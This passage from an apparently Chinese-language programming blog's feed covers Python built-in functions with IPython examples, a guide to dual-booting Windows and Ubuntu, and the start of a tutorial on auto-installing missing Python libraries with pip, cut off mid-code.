class="hljs-number">149</span>]: <span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><p>49 print(objects)</p><p>打印对象，此函数不解释</p><p>50 class property(fget=None, fset=None, fdel=None, doc=None)</p><p>返回 property 属性，典型的用法：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self._x = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getx</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self._x</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setx</span><span class="hljs-params">(self, value)</span>:</span></span><br><span class="line">        self._x = value</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delx</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">del</span> self._x</span><br><span class="line">    <span class="hljs-comment"># 使用property类创建 property 属性</span></span><br><span class="line">    x = property(getx, setx, delx, <span class="hljs-string">"I'm the 'x' property."</span>)</span><br><span class="line">使用python装饰器，实现与上完全一样的效果代码：</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self._x = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @property</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">x</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self._x</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @x.setter</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">x</span><span class="hljs-params">(self, value)</span>:</span></span><br><span class="line">        self._x = value</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @x.deleter</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">x</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">del</span> self._x</span><br></pre></td></tr></table></figure><p>51 range(stop)</p><p>range(start, stop[,step])<br>生成一个不可变序列：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">153</span>]: range(<span class="hljs-number">11</span>)</span><br><span class="line">Out[<span class="hljs-number">153</span>]: range(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">154</span>]: range(<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)</span><br><span class="line">Out[<span class="hljs-number">154</span>]: range(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)</span><br></pre></td></tr></table></figure><p>52 reversed(seq)</p><p>返回一个反向的 iterator:</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">155</span>]: rev = reversed([<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">156</span>]: <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rev:</span><br><span class="line">     ...:     print(i)</span><br><span class="line">     ...:</span><br><span class="line"><span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><p>53 round(number[, ndigits])</p><p>四舍五入，ndigits代表小数点后保留几位：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">157</span>]: round(<span class="hljs-number">10.0222222</span>, <span class="hljs-number">3</span>)</span><br><span class="line">Out[<span class="hljs-number">157</span>]: <span class="hljs-number">10.022</span></span><br></pre></td></tr></table></figure><p>54 class set([iterable])</p><p>返回一个set对象，可实现去重：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">159</span>]: a = [<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">160</span>]: set(a)</span><br><span class="line">Out[<span class="hljs-number">160</span>]: &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;</span><br></pre></td></tr></table></figure><p>55 class slice(stop)</p><p>class slice(start, stop[, step])</p><p>返回一个表示由 range(start, stop, step) 所指定索引集的 slice对象</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">170</span>]: a = [<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">171</span>]: a[slice(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>)] <span class="hljs-comment">#等价于a[0:5:2]</span></span><br><span class="line">Out[<span class="hljs-number">171</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]</span><br></pre></td></tr></table></figure><p>56 sorted(iterable, *, key=None, reverse=False)</p><p>排序：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">174</span>]: a = [<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">175</span>]: sorted(a,reverse=<span class="hljs-literal">True</span>)</span><br><span class="line">Out[<span class="hljs-number">175</span>]: [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">178</span>]: a = [&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'xiaoming'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">18</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'male'</span>&#125;,&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">     ...: xiaohong'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">20</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'female'</span>&#125;]</span><br><span class="line">In [<span class="hljs-number">180</span>]: sorted(a,key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">'age'</span>],reverse=<span class="hljs-literal">False</span>)</span><br><span class="line">Out[<span class="hljs-number">180</span>]:</span><br><span class="line">[&#123;<span class="hljs-string">'name'</span>: <span class="hljs-string">'xiaoming'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">18</span>, <span class="hljs-string">'gender'</span>: <span class="hljs-string">'male'</span>&#125;,</span><br><span class="line"> &#123;<span class="hljs-string">'name'</span>: <span class="hljs-string">'xiaohong'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>, <span class="hljs-string">'gender'</span>: <span class="hljs-string">'female'</span>&#125;]</span><br></pre></td></tr></table></figure><p>57 @staticmethod</p><p>将方法转换为静态方法，不做解释</p><p>58 class str(object=’’)</p><p>返回一个 str版本的 object，str 是内置字符串 class</p><p>59 sum(iterable, /, start=0)</p><p>求和：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">181</span>]: a = [<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">182</span>]: sum(a)</span><br><span class="line">Out[<span class="hljs-number">182</span>]: <span class="hljs-number">11</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">185</span>]: sum(a,<span class="hljs-number">10</span>) <span class="hljs-comment">#求和的初始值为10</span></span><br><span class="line">Out[<span class="hljs-number">185</span>]: <span class="hljs-number">21</span></span><br></pre></td></tr></table></figure><p>60 super([type[, object-or-type]])</p><p>返回一个代理对象，它会将方法调用委托给 type 的父类或兄弟类</p><p>61 tuple([iterable])</p><p>虽然被称为函数，但 tuple 实际上是一个不可变的序列类型</p><p>62 class type(object)</p><p>class type(name, bases, dict)</p><p>传入一个参数时，返回 object 的类型：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">186</span>]: type(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">186</span>]: __main__.Student</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">187</span>]: type(tuple())</span><br><span class="line">Out[<span class="hljs-number">187</span>]: tuple</span><br></pre></td></tr></table></figure><p>63 zip(*iterables)</p><p>创建一个聚合了来自每个可迭代对象中的元素的迭代器：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">188</span>]: x = [<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]</span><br><span class="line">In [<span class="hljs-number">189</span>]: y = [<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line">In [<span class="hljs-number">190</span>]: list(zip(y,x))</span><br><span class="line">Out[<span class="hljs-number">190</span>]: [(<span class="hljs-number">4</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">6</span>, <span class="hljs-number">1</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">191</span>]: a = range(<span class="hljs-number">5</span>)</span><br><span class="line">In [<span class="hljs-number">192</span>]: b = list(<span class="hljs-string">'abcde'</span>)</span><br><span class="line">In [<span class="hljs-number">193</span>]: b</span><br><span class="line">Out[<span class="hljs-number">193</span>]: [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>]</span><br><span class="line">In [<span class="hljs-number">194</span>]: [str(y) + str(x) <span class="hljs-keyword">for</span> x,y <span class="hljs-keyword">in</span> zip(a,b)]</span><br><span class="line">Out[<span class="hljs-number">194</span>]: [<span class="hljs-string">'a0'</span>, <span class="hljs-string">'b1'</span>, <span class="hljs-string">'c2'</span>, <span class="hljs-string">'d3'</span>, <span class="hljs-string">'e4'</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1 abs()&lt;/p&gt;
&lt;p&gt;绝对值或复数的模&lt;/p&gt;
&lt;figure class=&quot;highlight python hljs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;In [&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]: abs(&lt;span class=&quot;hljs-number&quot;&gt;-6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Out[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]: &lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="内置函数" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>手把手配置AI项目的环境(双系统)</title>
    <link href="http://yoursite.com/2019/11/02/%E6%89%8B%E6%8A%8A%E6%89%8B%E9%85%8D%E7%BD%AEAI%E9%A1%B9%E7%9B%AE%E7%9A%84%E7%8E%AF%E5%A2%83-%E5%8F%8C%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoursite.com/2019/11/02/手把手配置AI项目的环境-双系统/</id>
    <published>2019-11-02T05:07:42.000Z</published>
    <updated>2019-11-02T05:30:14.750Z</updated>
    
    <content type="html"><![CDATA[<p>此篇文章是为了介绍如何安装双系统（win+ubuntu），对于简单的一下过程不再描述，对于关键环节做出说明介绍。</p><a id="more"></a><h2 id="1-下载ubuntu镜像"><a href="#1-下载ubuntu镜像" class="headerlink" title="1.下载ubuntu镜像"></a>1.下载ubuntu镜像</h2><p>可以先进入中国linux官网：<a href="https://cn.ubuntu.com/" target="_blank" rel="noopener">https://cn.ubuntu.com/</a> ，选择Ubuntu桌面系统，之后选择下载ubuntu。</p><p>可以选择两个版本，这两个版本都是比较稳定的：</p><ol><li><p><a href="http://releases.ubuntu.com/18.04/" target="_blank" rel="noopener">http://releases.ubuntu.com/18.04/</a></p></li><li><p><a href="http://releases.ubuntu.com/16.04/" target="_blank" rel="noopener">http://releases.ubuntu.com/16.04/</a></p></li></ol><h2 id="2-制作启动盘"><a href="#2-制作启动盘" class="headerlink" title="2.制作启动盘"></a>2.制作启动盘</h2><p>建议实用<strong>USBwriter</strong> 进行制作</p><h2 id="3-电脑磁盘分区"><a href="#3-电脑磁盘分区" class="headerlink" title="3.电脑磁盘分区"></a>3.电脑磁盘分区</h2><p>自行百度</p><h2 id="4-设置BIOS，U盘启动"><a href="#4-设置BIOS，U盘启动" class="headerlink" title="4.设置BIOS，U盘启动"></a>4.设置BIOS，U盘启动</h2><p>有些电脑需要设置BIOS启动，其他电脑我用过DELL等，都是直接开机长按F2,F12,F10都有，如何成功进入BIOS，百度一下自己的电脑即可。</p><p>当然如果是笔记本就是Fn+按键即可</p><h2 id="5-开始安装Ubuntu"><a href="#5-开始安装Ubuntu" class="headerlink" title="5.开始安装Ubuntu"></a>5.开始安装Ubuntu</h2><p>一波傻瓜式操作</p><h2 id="6-分区"><a href="#6-分区" class="headerlink" title="6.分区"></a>6.分区</h2><p>主要分以下这些：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">swap：用作虚拟内存，这个一般和自己的物理内存一般大</span><br><span class="line">/：主要用来存放Linux系统文件</span><br><span class="line">/boot:存放linux内核，用来引导系统的，如果是Legacy启动就要设置引导，UEFI就不用设置这个（UEFI要设置EFI文件）</span><br><span class="line">/usr:存放用户程序，一般在/usr/bin中存放发行版提供的程序，用户自行安装的程序默认安装到/usr/local/bin中</span><br><span class="line">/home:存放用户文件</span><br></pre></td></tr></table></figure><p>当初压缩的磁盘如下图所示，选中那个空闲磁盘，然后点击+号，开始分配。</p><p><a href="https://sm.ms/image/lnKGxUCBOs4zVXu" target="_blank"><img src="https://i.loli.net/2019/11/02/lnKGxUCBOs4zVXu.jpg"></a></p><p>① 分配swap，选择主分区，空间起始位置，大小最好和自己物理内存一样（我的是16G分配两倍，以后可能装个内存条所以分配32G），用于交换空间</p><p><a href="https://sm.ms/image/FEjanXhHdep8QrM" target="_blank"><img src="https://i.loli.net/2019/11/02/FEjanXhHdep8QrM.jpg"></a></p><p>② 设置EFI引导，选择逻辑分区，空间起始位置，用于EFI系统分区，大小设置4G即可</p><p>③ 设置Boot引导，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/boot，大小设置8G</p><p>④ 设置/，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/，大小的话推荐100G.</p><p>⑤ 设置home，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/home，home大一些300G</p><p>⑥ 设置usr，选择逻辑分区，空间起始位置，用于Ext4日志文件，挂载点：/usr，大小的话剩下100G。</p><p>以上分配方式，EFI需要依照前面的①步骤分配，其余②-⑥全部以home分配为例进行分配如下图类似，自行分配即可，不一样的只是分配的大小 </p><p><a href="https://sm.ms/image/ZjfQMvzmsEaJH2L" target="_blank"><img src="https://i.loli.net/2019/11/02/ZjfQMvzmsEaJH2L.jpg"></a></p><p>分配好之后如下图方框所示，椭圆形为需要安装的前的最后一步设置引导器，选择设置为EFI的引导盘作为安装启动器设备，如下图所示。 </p><p><a href="https://sm.ms/image/2lcSFuvPotEpefA" target="_blank"><img src="https://i.loli.net/2019/11/02/2lcSFuvPotEpefA.jpg"></a></p><p><a href="https://sm.ms/image/u2capUBFsWNICkP" target="_blank"><img src="https://i.loli.net/2019/11/02/u2capUBFsWNICkP.jpg"></a></p><p><a href="https://sm.ms/image/8CkmYrosnFx1ZTA" target="_blank"><img src="https://i.loli.net/2019/11/02/8CkmYrosnFx1ZTA.jpg"></a></p><p>等待完成就可以了。</p><h2 id="7-设置启动引导"><a href="#7-设置启动引导" class="headerlink" title="7.设置启动引导"></a>7.设置启动引导</h2><p>可以实用EasyBCD 2.3软件来设置引导，参考如下：<a href="https://blog.csdn.net/u014422976/article/details/80393841" target="_blank" rel="noopener">https://blog.csdn.net/u014422976/article/details/80393841</a></p><p>自我感觉比较麻烦并且很多时候不好用，这里推荐使用BOOT引导，即：首先进入电脑BIOS设置后，把boot的linux启动项调到windows上面即可，之后保存重启即可进入每次就有选系统的界面了。</p><h2 id="8-一些问题的解决"><a href="#8-一些问题的解决" class="headerlink" title="8.一些问题的解决"></a>8.一些问题的解决</h2><p>解决方法：</p><p>Pro1：安装ubuntu的时候由于分辨率问题，导致安装界面显示不全（如图），没法继续安装<br><a href="https://zhidao.baidu.com/question/522177686034499645.html?word=Ubuntu" target="_blank" rel="noopener">https://zhidao.baidu.com/question/522177686034499645.html?word=Ubuntu</a> 安装过程中分辨率不兼容</p><p>Pro2：最后的引导问题：<br><a href="https://blog.csdn.net/u014422976/article/details/80393841" target="_blank" rel="noopener">https://blog.csdn.net/u014422976/article/details/80393841</a></p><p>Pro3：装Ubuntu老停在ubuntu界面<br><a href="https://zhidao.baidu.com/question/923767939677091819?g_f=11301026&amp;word=" target="_blank" rel="noopener">https://zhidao.baidu.com/question/923767939677091819?g_f=11301026&amp;word=</a> 装Ubuntu老停在ubuntu界面</p><p>Pro4：ubuntu 安装完成后重启电脑报错: BUG soft lockup 的解决办法<br><a href="https://blog.csdn.net/xrinosvip/article/details/80447139" target="_blank" rel="noopener">https://blog.csdn.net/xrinosvip/article/details/80447139</a></p><p>Pro5: 解決搜狗输入法无法安装的问题：<br><a href="https://blog.csdn.net/qq_22186119/article/details/70316727" target="_blank" rel="noopener">https://blog.csdn.net/qq_22186119/article/details/70316727</a></p><p>Pro6: ubuntu搜狗输入法中文无法切换英文：<br><a href="https://blog.csdn.net/kang_tju/article/details/54630994" target="_blank" rel="noopener">https://blog.csdn.net/kang_tju/article/details/54630994</a></p><p>Pro7：装完双系统之后,linux和windows转换最后windows下时间错乱，早了八个小时解决方案<br><a href="https://blog.csdn.net/qq_40197828/article/details/79334158" target="_blank" rel="noopener">https://blog.csdn.net/qq_40197828/article/details/79334158</a></p><p>Pro8: Linux（Ubuntu16.04）调节屏幕亮度（亮度控制条消失的问题）：<br><a href="https://blog.csdn.net/kingthon/article/details/81190898" target="_blank" rel="noopener">https://blog.csdn.net/kingthon/article/details/81190898</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此篇文章是为了介绍如何安装双系统（win+ubuntu），对于简单的一下过程不再描述，对于关键环节做出说明介绍。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="双系统" scheme="http://yoursite.com/tags/%E5%8F%8C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>python自动导入缺失的库</title>
    <link href="http://yoursite.com/2019/10/30/python%E8%87%AA%E5%8A%A8%E5%AF%BC%E5%85%A5%E7%BC%BA%E5%A4%B1%E7%9A%84%E5%BA%93/"/>
    <id>http://yoursite.com/2019/10/30/python自动导入缺失的库/</id>
    <published>2019-10-30T04:43:31.000Z</published>
    <updated>2019-10-30T04:57:22.587Z</updated>
    
    <content type="html"><![CDATA[<p>在写 Python 项目的时候，我们可能经常会遇到导入模块失败的错误：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ImportError: No module named 'xxx'</span><br><span class="line">或者</span><br><span class="line">ModuleNotFoundError: No module named 'xxx'</span><br></pre></td></tr></table></figure><a id="more"></a><p>导入失败问题，通常分为两种：一种是导入自己写的模块（即以 .py 为后缀的文件），另一种是导入三方库。本文主要讨论第二种情况。</p><h2 id="1-单个模块中缺失的库"><a href="#1-单个模块中缺失的库" class="headerlink" title="1.单个模块中缺失的库"></a>1.单个模块中缺失的库</h2><p>在编写代码的时候，如果我们需要使用某个三方库（如 requests），但不确定实际运行的环境是否装了它，那么可以这样：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">except</span> ImportError:</span><br><span class="line">    <span class="hljs-keyword">import</span> os</span><br><span class="line">    os.system(<span class="hljs-string">'pip install requests'</span>)</span><br><span class="line">    <span class="hljs-keyword">import</span> requests</span><br></pre></td></tr></table></figure><p>这样写的效果是，如果找不到 requests 库，就先安装，再导入。</p><p>在某些开源项目中，我们可能还会看到如下的写法（以 json 为例）：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-keyword">import</span> simplejson <span class="hljs-keyword">as</span> json</span><br><span class="line"><span class="hljs-keyword">except</span> ImportError:</span><br><span class="line">    <span class="hljs-keyword">import</span> json</span><br></pre></td></tr></table></figure><p>这样写的效果是，优先导入三方库 simplejson，如果找不到，那就使用内置的标准库 json。</p><p>这种写法的好处是不需要导入额外的库，但它有个缺点，即需要保证那两个库在使用上是兼容的，如果在标准库中找不到替代的库，那就不可行了。</p><p>如果真找不到兼容的标准库，也可以自己写一个模块（如 my_json.py），实现想要的东西，然后在 except 语句中导入它。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-keyword">import</span> simplejson <span class="hljs-keyword">as</span> json</span><br><span class="line"><span class="hljs-keyword">except</span> ImportError:</span><br><span class="line">    <span class="hljs-keyword">import</span> my_json <span class="hljs-keyword">as</span> json</span><br></pre></td></tr></table></figure><h2 id="2-整个项目中缺失的库"><a href="#2-整个项目中缺失的库" class="headerlink" title="2.整个项目中缺失的库"></a>2.整个项目中缺失的库</h2><p>以上的思路是针对开发中的项目，但是它有几个不足：</p><p>1、在代码中对每个可能缺失的三方库都 pip install，并不可取；</p><p>2、某个三方库无法被标准库或自己手写的库替代，该怎么办？</p><p>3、已成型的项目，不允许做这些修改怎么办？</p><p>所以这里的问题是：有一个项目，想要部署到新的机器上，它涉及很多三方库，但是机器上都没有预装，该怎么办？</p><p>对于一个合规的项目，按照约定，通常它会<strong>包含一个“requirements.txt ”文件</strong> ，记录了该项目的所有依赖库及其所需的版本号。这是在项目发布前，使用命令<strong>pip freeze &gt; requirements.txt</strong> 生成的。</p><p>使用命令<strong>pip install -r requirements.txt</strong> （在该文件所在目录执行，或在命令中写全文件的路径），就能自动把所有的依赖库给装上。</p><p>但是，如果项目不合规，或者由于其它倒霉的原因，我们没有这样的文件，又该如何是好？</p><p>一个笨方法就是，把项目跑起来，等它出错，遇到一个导库失败，就手动装一个，然后再跑一遍项目，遇到导库失败就装一下，如此循环……（此处省略 1 万句脏话）……</p><h2 id="3-自动导入任意缺失的库"><a href="#3-自动导入任意缺失的库" class="headerlink" title="3.自动导入任意缺失的库"></a>3.自动导入任意缺失的库</h2><p>在不修改原有的代码的情况下，在不需要“requirements.txt”文件的情况下，有没有办法自动导入所需要的库呢？</p><p>当然有！先看看效果：</p><p><a href="https://sm.ms/image/aNv49Eqr5D1xBHj" target="_blank"><img src="https://i.loli.net/2019/10/30/aNv49Eqr5D1xBHj.jpg"></a></p><p>我们以 tornado 为例，第一步操作可看出，我们没有装过 tornado，经过第二步操作后，再次导入 tornado 时，程序会帮我们自动下载并安装好 tornado，所以不再报错。</p><p>autoinstall 是我们手写的模块，代码如下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 以下代码在 python 3.6.1 版本验证通过</span></span><br><span class="line"><span class="hljs-keyword">import</span> sys</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">from</span> importlib <span class="hljs-keyword">import</span> import_module</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AutoInstall</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    _loaded = set()</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @classmethod</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_spec</span><span class="hljs-params">(cls, name, path, target=None)</span>:</span></span><br><span class="line">            <span class="hljs-keyword">if</span> path <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cls._loaded:</span><br><span class="line">                cls._loaded.add(name)</span><br><span class="line">                print(<span class="hljs-string">"Installing"</span>, name)</span><br><span class="line">                <span class="hljs-keyword">try</span>:</span><br><span class="line">                    result = os.system(<span class="hljs-string">'pip install &#123;&#125;'</span>.format(name))</span><br><span class="line">                    <span class="hljs-keyword">if</span> result == <span 